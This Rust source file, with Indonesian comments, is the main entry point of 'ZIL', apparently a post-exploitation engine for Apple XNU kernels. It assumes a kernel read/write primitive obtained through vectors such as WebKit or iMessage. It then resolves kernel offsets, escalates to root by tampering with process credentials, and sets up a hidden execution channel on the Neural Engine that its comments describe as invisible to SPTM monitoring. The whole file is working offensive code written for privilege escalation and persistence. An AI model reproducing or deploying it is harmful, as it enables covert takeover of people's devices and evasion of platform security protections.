#![no_std]
#![no_main]

extern crate zil_core;

use zil_core::healing::{engine::HealingEngine, state::{OrganismState, DiagnosticJournal}};
use zil_core::evolution::{
    kcall_primitive::KCallManager,
    payload_escalation::EscalationEngine,
    heuristic_scanner::HeuristicAnalyzer,
};
use zil_core::drivers::npu::HardwareAccelerator;
use zil_core::npu::npu_asymmetric::AsymmetricNpuExploit;

// --- LINKING C EXTERNALS ---
extern "C" {
    fn iokit_set_dynamic_vtable_index(idx: u64);
    // MAN-D: Buka/tutup IOKit ANE UserClient dari kernel side
    fn iokit_open_ane_client() -> u64;      // Return: ptr ke IOUserClient, 0 jika gagal
    fn iokit_close_ane_client(client: u64); // Cleanup handle
    // MAN-C: Probe VTable index ANE secara runtime
    fn iokit_probe_ane_vtable_index(client: u64, ktext_start: u64, ktext_end: u64) -> u64;
    // SARAN 3: Fungsi ANE asymmetric dari ane_asymmetric.c
    fn zil_ane_request_exec_buffer(client: *mut core::ffi::c_void) -> i32;
    fn zil_ane_is_ready() -> i32;
}

const SHARED_INFO_PTR: *const SharedBootInfo = 0x100000000 as *const SharedBootInfo;

// FIX: SharedBootInfo sekarang identik dengan Pathfinder (tambah our_pid + _padding)
#[repr(C)]
struct SharedBootInfo {
    is_ready:      bool,
    kernel_base:   u64,
    kernel_slide:  u64,
    gpu_integrity: u32,
    device_id:     u32,
    our_pid:       u32,  // ← Dibaca dari Pathfinder, diteruskan ke EscalationEngine
    _padding:      u32,
}

// --- TELEMETRY FFI EXPORT (RESIDUAL 3) ---
// Fungsi ini merupakan jembatan Rust → Swift untuk monitoring telemetri.
// Dipanggil oleh zil_api.swift melalui @_silgen_name("zil_rust_get_telemetry")
#[no_mangle]
pub extern "C" fn zil_rust_get_telemetry(
    out_near_misses:  *mut u32,
    out_successes:    *mut u32,
    out_failures:     *mut u32,
) {
    // Akses telemetri dari instance static yang diperbarui saat runtime
    // Dalam arsitektur ini kita simpan snapshot terakhir di statis
    unsafe {
        if !out_near_misses.is_null()  { *out_near_misses  = LAST_NEAR_MISSES;  }
        if !out_successes.is_null()    { *out_successes    = LAST_SUCCESSES;    }
        if !out_failures.is_null()     { *out_failures     = LAST_FAILURES;     }
    }
}

// Storage statis untuk snapshot telemetri terakhir (no_std compatible)
static mut LAST_NEAR_MISSES: u32 = 0;
static mut LAST_SUCCESSES:   u32 = 0;
static mut LAST_FAILURES:    u32 = 0;

/// Simpan snapshot telemetri ke storage statis agar bisa diakses Swift via FFI.
fn flush_telemetry(healer: &HealingEngine) {
    let (nm, sc, fl) = healer.get_telemetry_snapshot();
    unsafe {
        LAST_NEAR_MISSES = nm;
        LAST_SUCCESSES   = sc;
        LAST_FAILURES    = fl;
    }
}

#[no_mangle]
pub extern "C" fn _start() -> ! {
    // ╔══════════════════════════════════════════════════════════════╗
    // ║  ZIL KOMPARTEMENTALISASI — KONTRAK FORMAL (SARAN 2)         ║
    // ║                                                              ║
    // ║  PRECONDITION: Caller WAJIB sudah memiliki kernel R/W       ║
    // ║  primitive dari vektor eksternal (WebKit, iMessage, etc.).  ║
    // ║                                                              ║
    // ║  ZIL TIDAK menyediakan initial infection vector.            ║
    // ║  ZIL HANYA beroperasi sebagai Post-Exploitation Engine:     ║
    // ║    → Privilege escalation (ucred manipulation)              ║
    // ║    → Data-only kernel struct modification                   ║
    // ║    → NPU/GPU stealth execution path                        ║
    // ║    → Self-healing & telemetry                              ║
    // ╚══════════════════════════════════════════════════════════════╝

    // 1. INIT SYSTEMS
    let mut healer  = HealingEngine::new();
    let mut journal = DiagnosticJournal::default();

    // 2. HANDSHAKE PATHFINDER
    let boot_info = unsafe { &*SHARED_INFO_PTR };
    let kernel_base = if boot_info.is_ready && boot_info.kernel_base != 0 {
        boot_info.kernel_base
    } else {
        flush_telemetry(&healer);
        healer.enter_deep_sleep();
    };

    // Baca PID dari SharedBootInfo (ditulis oleh Pathfinder)
    let our_pid = unsafe { (*SHARED_INFO_PTR).our_pid };

    // 3. STATIC-AS-BASELINE + HEURISTIC REFINEMENT (Roadmap v1.5)
    // ════════════════════════════════════════════════════════════════
    // FILOSOFI BARU: Static offset = PATOKAN. Heuristic = REFINEMENT.
    //
    //   LANGKAH 1: Buat DynamicOffsets dari StaticOffsets per-chip (PATOKAN)
    //              Ini langsung valid sebelum scan apapun jalan.
    //   LANGKAH 2: Jalankan HeuristicAnalyzer — hasilkan kandidat offset baru
    //   LANGKAH 3: merge_with_heuristic() → per-field confidence gate:
    //              pakai heuristic jika ±0x28 dari static, static jika tidak
    //   LANGKAH 4: Hasil merge = final offset untuk payload
    //
    // Keuntungan: Static = trusted floor, Heuristic = runtime precision.
    // Jika keduanya gagal → ada patokan static sebagai safety net.
    // ════════════════════════════════════════════════════════════════

    let analyzer     = HeuristicAnalyzer::new();
    let offset_calc  = zil_core::evolution::offset_calculator::OffsetCalculator::new(kernel_base);

    let dynamic_offsets = match analyzer.analyze_kernel_structures(kernel_base) {
        Some(heuristic_result) => {
            // Heuristic berhasil — verifikasi cross-check dengan static DB
            if let Some(static_db) = offset_calc.get_offsets() {
                // Verifikasi p_pid: paling penting, harus match ±0x20
                let pid_ok = analyzer.verify_against_static_hint(
                    heuristic_result.proc_pid,
                    static_db.proc_pid,
                );
                // Verifikasi proc_ro_ucred offset
                let ucred_ok = analyzer.verify_against_static_hint(
                    heuristic_result.proc_ro_ucred,
                    static_db.proc_ro_ucred,
                );

                if pid_ok && ucred_ok {
                    // Heuristic & static DB setuju → KEPERCAYAAN MAKSIMAL
                    healer.record_success();
                } else {
                    // Divergensi — mungkin XNU baru. Percaya heuristic.
                    // Static DB hanya hint; heuristic scanning lebih akurat.
                    healer.attempt_recovery(&mut journal);
                }
            } else {
                // Chip baru (A20+) — tidak ada static DB, heuristic adalah satu-satunya
                healer.record_success();
            }
            flush_telemetry(&healer);
            heuristic_result
        },

        None => {
            // Heuristic gagal (kernel terlalu berubah atau memori tidak terbaca)
            // EMERGENCY FALLBACK: coba static DB jika chip dikenal
            if let Some(static_db) = offset_calc.get_offsets() {
                healer.attempt_recovery(&mut journal);
                flush_telemetry(&healer);
                // Gunakan static DB sebagai last resort
                // p_proc_ro selalu 0x18 (invariant dari struct proc layout)
                // proc_ro_ucred default 0x20 dari riset komunitas XNU
                zil_core::evolution::heuristic_scanner::DynamicOffsets {
                    proc_pid:           static_db.proc_pid,
                    proc_proc_ro:       0x18,
                    proc_ro_ucred:      0x20,  // offset p_ro_cred di proc_ro
                    iokit_vtable_idx:   7,
                    proc_pid_func_addr: 0,     // tidak diketahui via static DB
                }
            } else {
                // Kedua metode gagal — enter recovery
                healer.record_failure(&mut journal, "SCAN_FAIL: Heuristic & static both failed");
                flush_telemetry(&healer);
                if !healer.attempt_recovery(&mut journal) {
                    healer.enter_deep_sleep();
                }
                loop { }
            }
        }
    };

    // 4. UPDATE GLOBAL STATE (C Shim & Escalator)
    unsafe {
        iokit_set_dynamic_vtable_index(dynamic_offsets.iokit_vtable_idx);
    }

    // 5. ROOT ESCALATION
    let mut kcall_mgr = KCallManager::new();

    // BUG-05 FIX: Gunakan proc_pid_func_addr sebagai springboard real.
    // proc_pid() adalah fungsi 2-instruksi (LDR W0,[X0,#off] + RET) yang sangat stabil.
    // Alamatnya ditemukan langsung oleh HeuristicScanner dari kernel text scan.
    // Jika scanner tidak menemukannya (0), fallback ke kernel_base+0x1000.
    let springboard = if dynamic_offsets.proc_pid_func_addr != 0 {
        dynamic_offsets.proc_pid_func_addr
    } else {
        kernel_base + 0x1000 // fallback — ganti dengan addr real jika diketahui
    };
    kcall_mgr.activate(springboard);

    let mut escalator = EscalationEngine::new();

    // Teruskan offset dinamis dari HeuristicScanner ke EscalationEngine
    // XNU 12377: ucred diakses via dua-hop proc_ro indirection
    // proc->p_proc_ro->p_ro_cred
    escalator.set_offsets(
        dynamic_offsets.proc_proc_ro,   // offset p_proc_ro di dalam proc
        dynamic_offsets.proc_ro_ucred,  // offset p_ro_cred di dalam proc_ro
        dynamic_offsets.proc_pid,       // offset p_pid di dalam proc
    );

    // MAN-A FIX: Teruskan KASLR slide dan allproc_static ke EscalationEngine
    // Tanpa ini, find_current_proc() akan baca dari alamat pre-KASLR → crash.
    let allproc_for_slide = offset_calc
        .get_offsets()
        .map(|o| o.allproc_static)
        .unwrap_or(zil_core::evolution::offset_calculator::StaticOffsets::PROC_LIST_HEAD);
    escalator.set_kaslr_slide(offset_calc.kaslr_slide(), allproc_for_slide);

    match escalator.execute_root_acquisition(&mut kcall_mgr) {
        Ok(target_proc) => {
            journal.state = OrganismState::Optimal;
            healer.record_success();
            flush_telemetry(&healer);

            // ─────────────────────────────────────────────────
            // 6. NPU ASYMMETRIC EXPLOITATION (SARAN 3)
            // ─────────────────────────────────────────────────
            // Root sudah diraih via proc_ro manipulation (Fase 5).
            // Sekarang aktifkan NPU stealth path sebagai persistent
            // execution channel yang invisible ke SPTM:
            //
            //   → Request compute buffer dari IOKit ANE (legit ke SPTM)
            //   → Write ARM64 priv-esc payload ke buffer yang approved
            //   → Submit sebagai "model AI" → ANE eksekusi payload
            //
            // Ini memberikan ZIL persistent execution capability di luar
            // pantauan CPU/SPTM setelah sesi exploitasi utama selesai.
            // ─────────────────────────────────────────────────

            // Inisialisasi accelerator dengan KASLR dari OffsetCalculator
            let kaslr_slide = boot_info.kernel_slide;
            let mut accelerator = HardwareAccelerator::new_with_kaslr(kaslr_slide);

            // ─────────────────────────────────────────────────────────
            // 5.5 MAN-D: Buka IOKit ANE UserClient setelah root diraih
            // ─────────────────────────────────────────────────────────
            // Root (cr_uid = 0) memberikan akses ke ANE privileged API.
            // iokit_open_ane_client() scan IOKit registry untuk menemukan
            // service "AppleH11ANEInterface" dan buka UserClient-nya.
            let ane_client_raw = unsafe { iokit_open_ane_client() };
            if ane_client_raw != 0 {
                // Simpan handle ke escalator agar bisa diakses NPU phase
                escalator.set_ane_client_ptr(ane_client_raw);

                // MAN-C: Probe VTable index ANE secara runtime
                // Hentikan penggunaan hardcode index 7 — probe dari VTable aktual.
                // Kernel text boundary: kernel_base .. kernel_base + 32MB
                let ktext_end = kernel_base.wrapping_add(0x2000000);
                let probed_idx = unsafe {
                    iokit_probe_ane_vtable_index(ane_client_raw, kernel_base, ktext_end)
                };
                // Update g_vtable_index di C side dengan hasil probe
                unsafe { iokit_set_dynamic_vtable_index(probed_idx); }
                healer.record_success();
            }
            // Jika ane_client_raw == 0 → skip NPU (non-fatal, root sudah diraih)

            // Ambil IOKit ANE client object dari EscalationEngine
            // (diisi oleh set_ane_client_ptr di atas, atau tetap null)
            let ane_client = escalator.get_ane_client_ptr();

            if !ane_client.is_null() && accelerator.is_npu_active() {
                let npu_exploit = AsymmetricNpuExploit::new(
                    ane_client as *mut u8,
                    dynamic_offsets.proc_pid,
                    dynamic_offsets.proc_proc_ro,
                    dynamic_offsets.proc_ro_ucred,
                );

                match npu_exploit.execute(target_proc) {
                    Ok(()) => {
                        // NPU stealth channel aktif ✓
                        healer.record_success();
                        flush_telemetry(&healer);
                        // Cleanup buffer setelah eksekusi
                        npu_exploit.cleanup();
                    }
                    Err(e) => {
                        // NPU gagal — tidak fatal, root sudah diraih sebelumnya
                        // ZIL tetap berfungsi tanpa stealth NPU path
                        healer.record_failure(&mut journal, e);
                        flush_telemetry(&healer);
                    }
                }
            } else {
                // ANE client tidak tersedia — fallback ke MMIO path
                // Root sudah diraih, NPU stealth tidak kritis
                if accelerator.is_npu_active() {
                    accelerator.power_on_via_mmio();
                }
            }
        },
        Err(e) => {
            journal.state = OrganismState::Compromised;
            healer.record_failure(&mut journal, e);
            flush_telemetry(&healer);
        }
    }

    // 7. MAIN LOOP
    loop {
        flush_telemetry(&healer);
    }
}

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    // Pastikan telemetri kegagalan tercatat sebelum stuck
    unsafe { LAST_FAILURES = LAST_FAILURES.saturating_add(1); }
    loop {}
}